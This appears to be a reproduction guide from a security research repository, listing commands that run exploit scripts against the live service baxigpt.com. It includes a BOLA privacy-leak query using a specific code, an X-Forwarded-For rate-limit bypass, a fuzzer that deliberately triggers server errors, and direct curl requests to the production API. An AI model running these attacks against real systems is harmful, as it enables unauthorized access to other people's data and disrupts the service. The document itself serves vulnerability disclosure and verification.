# Reproduction Guide

All commands assume repository root and Python 3.10+.

## Prerequisites

```bash
cd baxigpt-security-research   # or your clone path
python3 -m py_compile exploits/*.py
python3 -m unittest discover -s tests -v
```

## Release verification

Run the full gate into a scratch directory so live probes never mutate committed artifacts:

```bash
OUT_DIR=/tmp/baxigpt-verify ./scripts/verify_release.sh
# Produces: scripts-compile.log, language-check.log, poc-*.log, unit-tests.log,
#           round8-live.json, cli-help.log, git-status-*.log, github-publish.log
```

The gate requires a clean `git status` after completion.

## Unified audit CLI

```bash
# Health check
python3 exploits/baxigpt_audit.py health

# Verify a card (uses XFF rotation)
python3 exploits/baxigpt_audit.py code-info --code EU-HFNDFHD4

# Privacy leak demonstration (BOLA)
python3 exploits/baxigpt_audit.py query --code EU-HFNDFHD4

# Confirm OpenAPI exposure
python3 exploits/baxigpt_audit.py openapi --lines 30
```

## Rate-limit bypass

```bash
python3 exploits/ip_bypass_enum.py --code EU-HFNDFHD4
python3 exploits/ip_bypass_enum.py --code EU-HFNDFHD4 --query
```

## Type-confusion fuzz (generates 500s; use sparingly)

```bash
# Live run — write to scratch, not evidence/probes/
OUT=/tmp/baxigpt-verify/round8-live.json
python3 exploits/round8_fuzz500.py -o "$OUT"

# Offline payload inventory
python3 exploits/round8_fuzz500.py --dry-run
```

Committed evidence: `evidence/probes/round8/round8-fuzz.json`

## Manual curl equivalents

```bash
curl -s https://baxigpt.com/healthz
curl -s https://baxigpt.com/openapi.json | python3 -m json.tool | head
curl -s -X POST https://baxigpt.com/api/query \
  -H 'Content-Type: application/json' \
  -d '{"code":"EU-HFNDFHD4"}'
```

## Evidence files

| Finding | Artifact |
|---------|----------|
| BOLA | `evidence/probes/round8/round8-fuzz.json`, `evidence/probes/round8/round8-cards.json` |
| Rate bypass | `evidence/probes/pentest/pentest-enum-bypass.json` |
| Fuzz 500s | `evidence/probes/round8/round8-fuzz.json` |
| Admin brute negatives | `evidence/probes/round7/round7-full.json` |
| Captured OpenAPI | `evidence/snapshots/openapi.json` |